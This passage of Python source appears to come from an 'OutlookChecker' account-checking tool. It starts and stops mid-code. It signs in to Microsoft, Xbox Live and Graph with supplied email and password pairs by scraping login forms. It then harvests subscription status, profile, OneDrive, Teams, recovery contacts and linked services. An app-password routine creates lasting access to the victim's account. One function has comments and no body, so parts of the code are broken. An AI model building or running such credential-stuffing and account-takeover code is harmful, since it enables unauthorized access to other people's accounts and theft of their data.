                            sku.get('skuPartNumber', '').upper() in gpu_skus
                            and sku.get('capabilityStatus', '') == 'Enabled'
                            for sku in skus
                        )
                        if has_gpu:
                            details['xbox'] = {'game_pass_ultimate': True}
                        else:
                            details['xbox'] = {'game_pass_ultimate': False}
    except Exception:
        pass
    return details


def check_xbox_legacy(email, password):
    """Legacy Xbox Live OAuth flow – only for gamertag."""
    # (Keep the existing check_xbox code but rename it, or integrate it)
    # For brevity, you can keep the old function as is and call it here.
    # But we'll provide a simplified version that just grabs gamertag if possible.
    # However, to keep it short, I'll show the full revised flow.
    # See below for the full combined version.


def format_capture(account, details):
    if not details:
        return account
    parts = [account]

    if 'xbox' in details:
        xbox_data = details['xbox']

        # Core flag you requested
        if xbox_data.get('game_pass_ultimate'):
            parts.append("🎮 Game Pass Ultimate")

        # Optional extras – can keep or remove
        if xbox_data.get('gamertag'):
            parts.append(f"GT: {xbox_data['gamertag']}")
        if xbox_data.get('gamerscore'):
            parts.append(f"GS: {xbox_data['gamerscore']}")
        if xbox_data.get('account_tier'):
            parts.append(f"Tier: {xbox_data['account_tier']}")
        subs = xbox_data.get('xbox_subscriptions')
        if subs:
            parts.append(f"Subs: {', '.join(subs)}")

    return ' | '.join(parts)


GAME_PASS_ULTIMATE_SKUS = {
    "XBOX_GAME_PASS_ULTIMATE",
    "XBOXGAMEPASS_ULTIMATE",
    "GAME_PASS_ULTIMATE",
}

# ---- xbox_check.py (dependency for capture) ----


def check_xbox(email, password):
    details = {}
    try:
        with httpx.Client(timeout=15, follow_redirects=True) as client:
            auth_url = 'https://login.live.com/oauth20_authorize.srf'
            params = {
                'client_id': '0000000048093EE3',
                'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                'response_type': 'token',
                'scope': 'service::user.auth.xboxlive.com::MBI_SSL',
                'display': 'touch'
            }
            resp = client.get(auth_url, params=params)
            if resp.status_code != 200:
                return details
            html = resp.text
            ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html)
            post_url_match = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
            if not ppft_match or not post_url_match:
                return details
            payload = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': ppft_match.group(1),
                'PPSX': 'PassportRN',
                'type': '11',
                'LoginOptions': '1',
            }
            resp = client.post(post_url_match.group(1), data=payload)
            final_url = str(resp.url)
            if 'access_token=' in final_url:
                import urllib.parse
                fragment = final_url.split(
                    '#', 1)[1] if '#' in final_url else final_url.split('?', 1)[1]
                token_params = urllib.parse.parse_qs(fragment)
                access_token = token_params.get('access_token', [None])[0]
                if access_token:
                    xbox_auth_url = 'https://user.auth.xboxlive.com/user/authenticate'
                    xbox_payload = {
                        'RelyingParty': 'http://auth.xboxlive.com',
                        'TokenType': 'JWT',
                        'Properties': {
                            'AuthMethod': 'RPS',
                            'SiteName': 'user.auth.xboxlive.com',
                            'RpsTicket': f't={access_token}'
                        }
                    }
                    xbox_resp = client.post(xbox_auth_url, json=xbox_payload)
                    if xbox_resp.status_code == 200:
                        xbox_data = xbox_resp.json()
                        display_claims = xbox_data.get(
                            'DisplayClaims', {}).get('xui', [{}])
                        if display_claims:
                            details['gamertag'] = display_claims[0].get(
                                'gtg', 'Unknown')
                            details['xuid'] = display_claims[0].get('xid', '')
                            details['age_group'] = display_claims[0].get(
                                'agg', '')
                            details['has_xbox'] = True
                        user_token = xbox_data.get('Token', '')
                        user_hash = display_claims[0].get(
                            'uhs', '') if display_claims else ''
                        if user_token and user_hash:
                            xsts_url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
                            xsts_payload = {
                                'RelyingParty': 'http://xboxlive.com',
                                'TokenType': 'JWT',
                                'Properties': {
                                    'SandboxId': 'RETAIL',
                                    'UserTokens': [user_token]
                                }
                            }
                            xsts_resp = client.post(
                                xsts_url, json=xsts_payload)
                            if xsts_resp.status_code == 200:
                                xsts_data = xsts_resp.json()
                                xsts_token = xsts_data.get('Token', '')
                                if xsts_token:
                                    profile_url = f'https://profile.xboxlive.com/users/xuid({details.get("xuid", "")})/profile/settings'
                                    profile_params = {
                                        'settings': 'Gamertag,Gamerscore,AccountTier,XboxOneGamertag,GameDisplayPicRaw'}
                                    profile_headers = {
                                        'Authorization': f'XBL3.0 x={user_hash};{xsts_token}',
                                        'x-xbl-contract-version': '2'
                                    }
                                    try:
                                        profile_resp = client.get(
                                            profile_url, params=profile_params, headers=profile_headers)
                                        if profile_resp.status_code == 200:
                                            settings = profile_resp.json().get('profileUsers', [{}])[
                                                0].get('settings', [])
                                            for setting in settings:
                                                if setting.get('id') == 'Gamerscore':
                                                    details['gamerscore'] = setting.get(
                                                        'value', '0')
                                                elif setting.get('id') == 'AccountTier':
                                                    details['account_tier'] = setting.get(
                                                        'value', 'Unknown')
                                                elif setting.get('id') == 'GameDisplayPicRaw':
                                                    details['avatar_url'] = setting.get(
                                                        'value', '')
                                    except Exception:
                                        pass
                     # Fetch subscriptions via Graph
            try:
                token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
                token_payload = {
                    'grant_type': 'password',
                    'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
                    'scope': 'https://graph.microsoft.com/.default offline_access',
                    'username': email,
                    'password': password
                }
                graph_resp = client.post(token_url, data=token_payload)
                if graph_resp.status_code == 200:
                    access_token = graph_resp.json().get('access_token')
                    if access_token:
                        headers = {
                            'Authorization': f'Bearer {access_token}',
                            'Content-Type': 'application/json'
                        }
                        sub_resp = client.get(
                            'https://graph.microsoft.com/v1.0/me/subscribedSkus',
                            headers=headers
                        )
                        if sub_resp.status_code == 200:
                            skus = sub_resp.json().get('value', [])
                            xbox_subs = []
                            has_game_pass_ultimate = False
                            for sku in skus:
                                sku_name = sku.get('skuPartNumber', '').upper()
                                cap_status = sku.get('capabilityStatus', '')
                                # Check for Game Pass Ultimate specifically
                                if sku_name in GAME_PASS_ULTIMATE_SKUS and cap_status == 'Enabled':
                                    has_game_pass_ultimate = True
                                # Also collect any Xbox-related SKUs for logging
                                if 'XBOX' in sku_name or 'GAME_PASS' in sku_name:
                                    xbox_subs.append(
                                        f"{sku_name} ({cap_status})")
                            if has_game_pass_ultimate:
                                details['game_pass_ultimate'] = True
                            if xbox_subs:
                                details['xbox_subscriptions'] = xbox_subs
            except Exception:
                pass
    except Exception:
        pass
    return details


def format_xbox_result(account, details):
    if not details or not details.get('has_xbox'):
        return None
    parts = [account]
    if details.get('gamertag'):
        parts.append(f"GT: {details['gamertag']}")
    if details.get('gamerscore'):
        parts.append(f"GS: {details['gamerscore']}")
    if details.get('account_tier'):
        parts.append(f"Tier: {details['account_tier']}")
    subs = details.get('xbox_subscriptions')
    if subs:
        parts.append(f"Subs: {', '.join(subs)}")
    return ' | '.join(parts)


# ---- graph_api.py (optional) ----
def fetch_profile(email, password):
    profile = {}
    try:
        with httpx.Client(timeout=15) as client:
            token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
            token_payload = {
                'grant_type': 'password',
                'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
                'scope': 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Files.Read offline_access',
                'username': email,
                'password': password
            }
            resp = client.post(token_url, data=token_payload)
            if resp.status_code != 200:
                return profile
            token_data = resp.json()
            access_token = token_data.get('access_token')
            if not access_token:
                return profile
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Content-Type': 'application/json'
            }
            try:
                me_resp = client.get(
                    'https://graph.microsoft.com/v1.0/me', headers=headers)
                if me_resp.status_code == 200:
                    me_data = me_resp.json()
                    profile['display_name'] = me_data.get('displayName', '')
                    profile['job_title'] = me_data.get('jobTitle', '')
                    profile['mail'] = me_data.get('mail', '')
                    profile['mobile_phone'] = me_data.get('mobilePhone', '')
                    profile['office_location'] = me_data.get(
                        'officeLocation', '')
                    profile['preferred_language'] = me_data.get(
                        'preferredLanguage', '')
                    profile['user_principal'] = me_data.get(
                        'userPrincipalName', '')
                    profile['id'] = me_data.get('id', '')
            except Exception:
                pass
            try:
                drive_resp = client.get(
                    'https://graph.microsoft.com/v1.0/me/drive', headers=headers)
                if drive_resp.status_code == 200:
                    drive_data = drive_resp.json()
                    quota = drive_data.get('quota', {})
                    total_gb = quota.get('total', 0) / (1024**3)
                    used_gb = quota.get('used', 0) / (1024**3)
                    profile['onedrive_total_gb'] = round(total_gb, 2)
                    profile['onedrive_used_gb'] = round(used_gb, 2)
                    profile['onedrive_state'] = quota.get('state', 'Unknown')
            except Exception:
                pass
            try:
                groups_resp = client.get(
                    'https://graph.microsoft.com/v1.0/me/memberOf', headers=headers)
                if groups_resp.status_code == 200:
                    groups = groups_resp.json().get('value', [])
                    profile['groups'] = []
                    for g in groups[:10]:
                        profile['groups'].append({
                            'name': g.get('displayName', 'Unknown'),
                            'type': g.get('@odata.type', '').split('.')[-1]
                        })
            except Exception:
                pass
    except Exception:
        pass
    return profile


# ---- azure_check.py ----
def check_azure(email, password):
    details = {}
    try:
        with httpx.Client(timeout=15) as client:
            token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
            token_payload = {
                'grant_type': 'password',
                'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
                'scope': 'https://graph.microsoft.com/.default offline_access',
                'username': email,
                'password': password
            }
            resp = client.post(token_url, data=token_payload)
            if resp.status_code != 200:
                return details
            token_data = resp.json()
            access_token = token_data.get('access_token')
            if not access_token:
                return details
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Content-Type': 'application/json'
            }
            try:
                license_resp = client.get(
                    'https://graph.microsoft.com/v1.0/me/licenseDetails',
                    headers=headers
                )
                if license_resp.status_code == 200:
                    licenses = license_resp.json().get('value', [])
                    if licenses:
                        details['has_licenses'] = True
                        details['license_count'] = len(licenses)
                        plan_names = []
                        for lic in licenses:
                            plans = lic.get('servicePlans', [])
                            for plan in plans:
                                if plan.get('provisioningStatus') == 'Success':
                                    name = plan.get('servicePlanName', '')
                                    if name and name not in plan_names:
                                        plan_names.append(name)
                        details['active_plans'] = plan_names[:10]
                    else:
                        details['has_licenses'] = False
            except Exception:
                pass
            try:
                sub_resp = client.get(
                    'https://graph.microsoft.com/v1.0/me/subscribedSkus',
                    headers=headers
                )
                if sub_resp.status_code == 200:
                    skus = sub_resp.json().get('value', [])
                    if skus:
                        details['subscriptions'] = []
                        for sku in skus:
                            details['subscriptions'].append({
                                'name': sku.get('skuPartNumber', 'Unknown'),
                                'state': sku.get('capabilityStatus', 'Unknown')
                            })
            except Exception:
                pass
    except Exception:
        pass
    return details


# ---- recovery_data.py ----
def extract_recovery_info(email_addr, password):
    result = {
        'recovery_email': None,
        'recovery_phone': None,
        'has_security_questions': False,
        'proof_count': 0,
        'all_recovery_emails': [],
        'all_recovery_phones': [],
        'error': None,
    }
    session = None
    try:
        session = httpx.Client(timeout=30.0, follow_redirects=False)
        querystring = {
            'redirect_uri': 'msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D',
            'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
            'response_type': 'code',
            'login_hint': email_addr,
            'state': 'fo3JQhpJE4m9QBlN2Rho4w',
            'nonce': 'yB_pchsTbmenvX90Yqk7TA',
            'scope': 'https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access',
            'code_challenge': '9U8TeNniUmMcmT1SkXG17prawHTT19xGIrhJfflNPW4',
            'code_challenge_method': 'S256',
        }
        response = session.get(
            url='https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
            headers=headers1(), params=querystring
        )
        if response.status_code == 429:
            result['error'] = 'Rate limited'
            return result
        if response.status_code != 302:
            result['error'] = 'Unexpected initial response'
            return result
        redirect_url = response.headers.get('Location')
        if not redirect_url:
            result['error'] = 'No redirect URL'
            return result
        response = session.get(redirect_url, headers=headers2())
        while response.status_code in (301, 302, 303, 307, 308):
            next_url = response.headers.get('Location')
            if not next_url:
                break
            response = session.get(next_url, headers=headers2())
        if response.status_code == 429:
            result['error'] = 'Rate limited'
            return result
        if response.status_code != 200:
            result['error'] = f'Login page error: {response.status_code}'
            return result
        html = response.text
        ppft, post_url = _extract_ppft_and_post_url(html)
        if not post_url:
            result['error'] = 'Could not extract POST URL'
            return result
        payload = {
            'ps': '2', 'psRNGCDefaultType': '', 'psRNGCEntropy': '',
            'psRNGCSLK': '', 'canary': '', 'ctx': '', 'hpgrequestid': '',
            'PPFT': ppft or '', 'PPSX': 'PassportRN', 'NewUser': '1',
            'FoundMSAs': '', 'fspost': '0', 'i21': '0',
            'CookieDisclosure': '0', 'IsFidoSupported': '1',
            'isSignupPost': '0', 'isRecoveryAttemptPost': '0', 'i13': '1',
            'login': email_addr, 'loginfmt': email_addr, 'type': '11',
            'LoginOptions': '1', 'lrt': '', 'lrtPartition': '',
            'hisRegion': '', 'hisScaleUnit': '', 'passwd': password,
        }
        response = session.post(post_url, data=payload,
                                headers=headers3(redirect_url))
        if response.status_code == 429:
            result['error'] = 'Rate limited'
            return result
        while response.status_code in (301, 302, 303, 307, 308):
            new_url = response.headers.get('Location')
            if not new_url:
                break
            if '?code=' in new_url:
                break
            response = session.get(new_url, headers=headers2())
        if response.status_code == 429:
            result['error'] = 'Rate limited'
            return result
        text = response.text if response.text else ''
        if text:
            all_html = text
            if 'Your account or password is incorrect' in text:
                result['error'] = 'Invalid credentials'
                return result
            elif "That Microsoft account doesn" in text:
                result['error'] = 'Account does not exist'
                return result
            elif 'Abuse?' in text:
                result['error'] = 'Account locked'
                return result
            recovery_emails = _extract_masked_emails(all_html)
            recovery_phones = _extract_masked_phones(all_html)
            has_questions = _check_security_questions(all_html)
            try:
                proofs_response = session.get(
                    'https://account.live.com/proofs/Manage',
                    headers=headers2(),
                    follow_redirects=True
                )
                if proofs_response.status_code == 200:
                    proofs_html = proofs_response.text
                    proofs_emails = _extract_masked_emails(proofs_html)
                    proofs_phones = _extract_masked_phones(proofs_html)
                    for em in proofs_emails:
                        if em not in recovery_emails:
                            recovery_emails.append(em)
                    for ph in proofs_phones:
                        if ph not in recovery_phones:
                            recovery_phones.append(ph)
                    if not has_questions:
                        has_questions = _check_security_questions(proofs_html)
                    all_html += proofs_html
            except Exception:
                pass
            result['all_recovery_emails'] = recovery_emails
            result['all_recovery_phones'] = recovery_phones
            result['recovery_email'] = recovery_emails[0] if recovery_emails else None
            result['recovery_phone'] = recovery_phones[0] if recovery_phones else None
            result['has_security_questions'] = has_questions
            result['proof_count'] = _count_proof_methods(all_html)
            min_count = len(recovery_emails) + \
                len(recovery_phones) + (1 if has_questions else 0)
            if result['proof_count'] < min_count:
                result['proof_count'] = min_count
    except httpx.TimeoutException:
        result['error'] = 'Request timed out'
    except httpx.RequestError as e:
        result['error'] = f'Network error: {e}'
    except Exception as e:
        result['error'] = f'Unexpected error: {e}'
    finally:
        if session:
            session.close()
    return result


def _extract_ppft_and_post_url(html):
    ppft_match = re.search(r'name=\\?"PPFT\\?"[^>]*value=\\?"([^"\\]+)', html)
    if not ppft_match:
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html)
    ppft = ppft_match.group(1) if ppft_match else None
    pu_match = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
    if not pu_match:
        pu_match = re.search(r"urlPost:'([^']+)'", html)
    post_url = pu_match.group(1) if pu_match else None
    return ppft, post_url


def _extract_masked_emails(html):
    found = []
    seen = set()
    for pattern in (re.compile(r'[a-zA-Z][a-zA-Z0-9]?\*{2,}@[a-zA-Z]\*{2,}\.[a-zA-Z]{2,}'),
                    re.compile(r'[a-zA-Z][\w]*\*+[\w]*@[\w]*\*+[\w]*\.[\w]{2,}')):
        for match in pattern.finditer(html):
            candidate = match.group(0).strip()
            if candidate not in seen and '*' in candidate:
                seen.add(candidate)
                found.append(candidate)
    return found


def _extract_masked_phones(html):
    found = []
    seen = set()
    for pattern in (re.compile(r'\+\d{1,3}\s*[\d*Xx\s\-]{4,}[\d]{2,4}'),
                    re.compile(r'(?:\(\*+\)\s*)?[\d*\-\s]{5,}\d{2,4}')):
        for match in pattern.finditer(html):
            candidate = match.group(0).strip()
            normalized = re.sub(r'\s+', ' ', candidate)
            if normalized not in seen and ('*' in normalized or 'X' in normalized):
                seen.add(normalized)
                found.append(normalized)
    return found


def _check_security_questions(html):
    indicators = ['security question', 'SecurityQuestion', 'securityquestion',
                  'secret question', 'SecretQuestion', 'security_question']
    html_lower = html.lower()
    return any(ind.lower() in html_lower for ind in indicators)


def _count_proof_methods(html):
    count = 0
    proof_entries = re.findall(
        r'(?:\"type\"|proofType|data-bind.*?proof)', html, re.IGNORECASE)
    count += len(set(proof_entries))
    proof_display = re.findall(
        r'(?:data-proof|proof-display|proofConfirmation)', html, re.IGNORECASE)
    count += len(set(proof_display))
    if count == 0:
        emails = _extract_masked_emails(html)
        phones = _extract_masked_phones(html)
        has_questions = _check_security_questions(html)
        count = len(emails) + len(phones) + (1 if has_questions else 0)
    return count


# ---- subscription_capture.py ----
def capture_subscriptions(email_addr, password):
    result = {
        'licenses': [],
        'skus': [],
        'onedrive_plan': '',
        'onedrive_total_gb': 0.0,
        'has_premium': False,
        'error': None,
    }
    try:
        with httpx.Client(timeout=15.0) as client:
            token_payload = {
                'grant_type': 'password',
                'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
                'scope': 'https://graph.microsoft.com/.default offline_access',
                'username': email_addr,
                'password': password,
            }
            resp = client.post(
                'https://login.microsoftonline.com/common/oauth2/v2.0/token', data=token_payload)
            if resp.status_code != 200:
                result['error'] = 'Authentication failed'
                return result
            token_data = resp.json()
            access_token = token_data.get('access_token')
            if not access_token:
                result['error'] = 'No access token'
                return result
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Content-Type': 'application/json',
            }
            try:
                resp = client.get(
                    'https://graph.microsoft.com/v1.0/me/licenseDetails', headers=headers)
                if resp.status_code == 200:
                    licenses_data = resp.json().get('value', [])
                    for lic in licenses_data:
                        for plan in lic.get('servicePlans', []):
                            plan_name = plan.get('servicePlanName', 'Unknown')
                            prov_status = plan.get(
                                'provisioningStatus', 'Unknown')
                            result['licenses'].append(
                                {'name': plan_name, 'status': prov_status})
                            if prov_status == 'Success' and plan_name.upper() not in {
                                    'INTUNE_O365', 'INTUNE_SMBIZ', 'RIGHTSMANAGEMENT_ADHOC',
                                    'POWER_BI_STANDARD', 'FLOW_FREE', 'POWERAPPS_VIRAL',
                                    'MICROSOFT_BUSINESS_CENTER', 'WINDOWS_STORE', 'AAD_BASIC',
                                    'EXCHANGESTANDARD', 'DYN365_ENTERPRISE_P1_IW'}:
                                result['has_premium'] = True
            except Exception:
                pass
            try:
                resp = client.get(
                    'https://graph.microsoft.com/v1.0/me/subscribedSkus', headers=headers)
                if resp.status_code == 200:
                    skus_data = resp.json().get('value', [])
                    for sku in skus_data:
                        sku_name = sku.get('skuPartNumber', 'Unknown')
                        cap_status = sku.get('capabilityStatus', 'Unknown')
                        result['skus'].append(
                            {'name': sku_name, 'state': cap_status})
                        if cap_status == 'Enabled' and sku_name.upper() not in {
                                'INTUNE_O365', 'INTUNE_SMBIZ', 'RIGHTSMANAGEMENT_ADHOC',
                                'POWER_BI_STANDARD', 'FLOW_FREE', 'POWERAPPS_VIRAL',
                                'MICROSOFT_BUSINESS_CENTER', 'WINDOWS_STORE', 'AAD_BASIC',
                                'EXCHANGESTANDARD', 'DYN365_ENTERPRISE_P1_IW'}:
                            result['has_premium'] = True
            except Exception:
                pass
            try:
                resp = client.get(
                    'https://graph.microsoft.com/v1.0/me/drive', headers=headers)
                if resp.status_code == 200:
                    drive_data = resp.json()
                    result['onedrive_plan'] = drive_data.get(
                        'driveType', 'unknown')
                    quota = drive_data.get('quota', {})
                    total_bytes = quota.get('total', 0)
                    result['onedrive_total_gb'] = round(
                        total_bytes / (1024 ** 3), 2) if total_bytes else 0.0
            except Exception:
                pass
    except Exception as e:
        result['error'] = f'Unexpected error: {e}'
    return result


# ---- linked_services.py ----
def detect_linked_services(email_addr, password):
    result = {'services': [], 'error': None}
    try:
        with httpx.Client(timeout=15.0) as client:
            token_payload = {
                'grant_type': 'password',
                'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
                'scope': 'https://graph.microsoft.com/User.Read offline_access',
                'username': email_addr,
                'password': password,
            }
            resp = client.post(
                'https://login.microsoftonline.com/common/oauth2/v2.0/token', data=token_payload)
            access_token = None
            graph_headers = {}
            if resp.status_code == 200:
                token_data = resp.json()
                access_token = token_data.get('access_token')
                if access_token:
                    graph_headers = {
                        'Authorization': f'Bearer {access_token}',
                        'Content-Type': 'application/json',
                    }
            # Skype check
            if access_token:
                try:
                    resp = client.get(
                        'https://graph.microsoft.com/v1.0/me?$select=mySite,imAddresses', headers=graph_headers)
                    if resp.status_code == 200:
                        data = resp.json()
                        im_addresses = data.get('imAddresses', [])
                        skype_addr = [a for a in im_addresses if isinstance(
                            a, str) and ('skype' in a.lower() or 'sip:' in a.lower())]
                        if skype_addr or im_addresses:
                            result['services'].append(
                                {'name': 'Skype', 'linked': True, 'details': skype_addr[0] if skype_addr else im_addresses[0]})
                        else:
                            result['services'].append(
                                {'name': 'Skype', 'linked': False, 'details': None})
                except:
                    result['services'].append(
                        {'name': 'Skype', 'linked': False, 'details': 'Error'})
            else:
                result['services'].append(
                    {'name': 'Skype', 'linked': False, 'details': 'Auth failed'})
            # GitHub check
            try:
                github_headers = {'User-Agent': 'OutlookChecker/1.0',
                                  'Accept': 'application/vnd.github.v3+json'}
                resp = client.get(
                    f'https://api.github.com/search/users?q={email_addr}+in:email', headers=github_headers)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('total_count', 0) > 0:
                        items = data.get('items', [])
                        if items:
                            result['services'].append(
                                {'name': 'GitHub', 'linked': True, 'details': items[0].get('login', 'unknown')})
                        else:
                            result['services'].append(
                                {'name': 'GitHub', 'linked': False, 'details': None})
                    else:
                        result['services'].append(
                            {'name': 'GitHub', 'linked': False, 'details': None})
                else:
                    result['services'].append(
                        {'name': 'GitHub', 'linked': False, 'details': 'API error'})
            except:
                result['services'].append(
                    {'name': 'GitHub', 'linked': False, 'details': 'Error'})
            # Xbox Live check (simplified)
            try:
                with httpx.Client(timeout=15.0, follow_redirects=True) as xbox_client:
                    params = {
                        'client_id': '0000000048093EE3',
                        'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                        'response_type': 'token',
                        'scope': 'service::user.auth.xboxlive.com::MBI_SSL',
                        'display': 'touch',
                    }
                    resp = xbox_client.get(
                        'https://login.live.com/oauth20_authorize.srf', params=params)
                    if resp.status_code == 200:
                        html = resp.text
                        ppft = re.search(
                            r'name="PPFT"[^>]*value="([^"]+)"', html)
                        post_url = re.search(
                            r'"urlPost"\s*:\s*"([^"]+)"', html)
                        if ppft and post_url:
                            payload = {
                                'login': email_addr,
                                'loginfmt': email_addr,
                                'passwd': password,
                                'PPFT': ppft.group(1),
                                'PPSX': 'PassportRN',
                                'type': '11',
                                'LoginOptions': '1',
                            }
                            resp = xbox_client.post(
                                post_url.group(1), data=payload)
                            if 'access_token=' in str(resp.url):
                                result['services'].append(
                                    {'name': 'Xbox Live', 'linked': True, 'details': 'Access token obtained'})
                            else:
                                result['services'].append(
                                    {'name': 'Xbox Live', 'linked': False, 'details': None})
                        else:
                            result['services'].append(
                                {'name': 'Xbox Live', 'linked': False, 'details': 'Login page parse error'})
                    else:
                        result['services'].append(
                            {'name': 'Xbox Live', 'linked': False, 'details': f'HTTP {resp.status_code}'})
            except:
                result['services'].append(
                    {'name': 'Xbox Live', 'linked': False, 'details': 'Error'})
            # OneDrive
            if access_token:
                try:
                    resp = client.get(
                        'https://graph.microsoft.com/v1.0/me/drive', headers=graph_headers)
                    if resp.status_code == 200:
                        drive_data = resp.json()
                        drive_type = drive_data.get('driveType', '')
                        if drive_type:
                            quota = drive_data.get('quota', {})
                            total_gb = round(
                                quota.get('total', 0) / (1024 ** 3), 2) if quota.get('total') else 0
                            result['services'].append(
                                {'name': 'OneDrive', 'linked': True, 'details': f'{drive_type} ({total_gb}GB)'})
                        else:
                            result['services'].append(
                                {'name': 'OneDrive', 'linked': False, 'details': None})
                    else:
                        result['services'].append(
                            {'name': 'OneDrive', 'linked': False, 'details': f'HTTP {resp.status_code}'})
                except:
                    result['services'].append(
                        {'name': 'OneDrive', 'linked': False, 'details': 'Error'})
            else:
                result['services'].append(
                    {'name': 'OneDrive', 'linked': False, 'details': 'Auth failed'})
            # Teams
            if access_token:
                try:
                    resp = client.get(
                        'https://graph.microsoft.com/v1.0/me/joinedTeams', headers=graph_headers)
                    if resp.status_code == 200:
                        teams_data = resp.json().get('value', [])
                        if teams_data:
                            team_names = [t.get('displayName', 'Unknown')
                                          for t in teams_data[:3]]
                            result['services'].append(
                                {'name': 'Teams', 'linked': True, 'details': f"{len(teams_data)} teams: {', '.join(team_names)}"})
                        else:
                            result['services'].append(
                                {'name': 'Teams', 'linked': False, 'details': None})
                    else:
                        result['services'].append(
                            {'name': 'Teams', 'linked': False, 'details': f'HTTP {resp.status_code}'})
                except:
                    result['services'].append(
                        {'name': 'Teams', 'linked': False, 'details': 'Error'})
            else:
                result['services'].append(
                    {'name': 'Teams', 'linked': False, 'details': 'Auth failed'})
    except Exception as e:
        result['error'] = str(e)
    return result


# ---- app_password.py ----
def generate_app_password(email_addr, password):
    result = {'success': False, 'app_password': None, 'error': None}
    session = None
    try:
        session = httpx.Client(timeout=30.0, follow_redirects=False)
        querystring = {
            'redirect_uri': 'msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D',
            'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
            'response_type': 'code',
            'login_hint': email_addr,
            'state': 'fo3JQhpJE4m9QBlN2Rho4w',
            'nonce': 'yB_pchsTbmenvX90Yqk7TA',
            'scope': 'https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access',
            'code_challenge': '9U8TeNniUmMcmT1SkXG17prawHTT19xGIrhJfflNPW4',
            'code_challenge_method': 'S256',
        }
        response = session.get(
            url='https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
            headers=headers1(), params=querystring
        )
        if response.status_code == 429:
            result['error'] = 'Rate limited during authorization'
            return result
        if response.status_code != 302:
            result['error'] = f'Unexpected auth response: {response.status_code}'
            return result
        redirect_url = response.headers.get('Location')
        if not redirect_url:
            result['error'] = 'No redirect URL from authorization'
            return result
        response = session.get(redirect_url, headers=headers2())
        while response.status_code in (301, 302, 303, 307, 308):
            next_url = response.headers.get('Location')
            if not next_url:
                break
            response = session.get(next_url, headers=headers2())
        if response.status_code == 429:
            result['error'] = 'Rate limited at login page'
            return result
        if response.status_code != 200:
            result['error'] = f'Login page error: {response.status_code}'
            return result
        html = response.text
        ppft, post_url = _extract_ppft_and_post_url(html)
        if not post_url:
            result['error'] = 'Could not extract POST URL from login page'
            return result
        payload = {
            'ps': '2', 'psRNGCDefaultType': '', 'psRNGCEntropy': '',
            'psRNGCSLK': '', 'canary': '', 'ctx': '', 'hpgrequestid': '',
            'PPFT': ppft or '', 'PPSX': 'PassportRN', 'NewUser': '1',
            'FoundMSAs': '', 'fspost': '0', 'i21': '0',
            'CookieDisclosure': '0', 'IsFidoSupported': '1',
            'isSignupPost': '0', 'isRecoveryAttemptPost': '0', 'i13': '1',
            'login': email_addr, 'loginfmt': email_addr, 'type': '11',
            'LoginOptions': '1', 'lrt': '', 'lrtPartition': '',
            'hisRegion': '', 'hisScaleUnit': '', 'passwd': password,
        }
        response = session.post(post_url, data=payload,
                                headers=headers3(redirect_url))
        if response.status_code == 429:
            result['error'] = 'Rate limited during login'
            return result
        while response.status_code in (301, 302, 303, 307, 308):
            new_url = response.headers.get('Location')
            if not new_url:
                break
            response = session.get(new_url, headers=headers2())
        if response.status_code == 429:
            result['error'] = 'Rate limited after login'
            return result
        text = response.text if response.text else ''
        if 'Your account or password is incorrect' in text:
            result['error'] = 'Invalid credentials'
            return result
        elif "That Microsoft account doesn" in text:
            result['error'] = 'Account does not exist'
            return result
        elif 'Abuse?' in text:
            result['error'] = 'Account locked'
            return result
        try:
            app_pw_response = session.get(
                'https://account.live.com/proofs/AppPassword',
                headers=headers2(),
                follow_redirects=True,
            )
            if app_pw_response.status_code == 429:
                result['error'] = 'Rate limited accessing app password page'
                return result
            if app_pw_response.status_code != 200:
                result['error'] = f'App password page returned {app_pw_response.status_code}'
                return result
            app_pw_html = app_pw_response.text
            not_supported_indicators = [
                'app passwords are not available',
                'two-step verification is not turned on',
                'not supported',
                'enable two-step verification',
                'you need to turn on',
            ]
            for indicator in not_supported_indicators:
                if indicator.lower() in app_pw_html.lower():
                    result['error'] = '2FA not enabled or app passwords not supported'
                    return result
            if 'urlPost' in app_pw_html and 'passwd' in app_pw_html:
                result['error'] = 'Session expired; re-authentication required'
                return result
        except httpx.RequestError as e:
            result['error'] = f'Failed to access app password page: {e}'
            return result
        try:
            form_tokens = _extract_form_tokens(app_pw_html)
            create_payload = {'appName': 'OutlookChecker'}
            create_payload.update(form_tokens)
            create_headers = headers3(
                'https://account.live.com/proofs/AppPassword')
            create_headers['origin'] = 'https://account.live.com'
            create_response = session.post(
                'https://account.live.com/proofs/AppPassword/Create',
                data=create_payload,
                headers=create_headers,
                follow_redirects=True,
            )
            if create_response.status_code == 429:
                result['error'] = 'Rate limited during app password creation'
                return result
            if create_response.status_code != 200:
                result['error'] = f'App password creation returned {create_response.status_code}'
                return result
            create_html = create_response.text
            app_pw = _extract_app_password(create_html)
            if app_pw:
                result['success'] = True
                result['app_password'] = app_pw
            else:
                error_match = re.search(
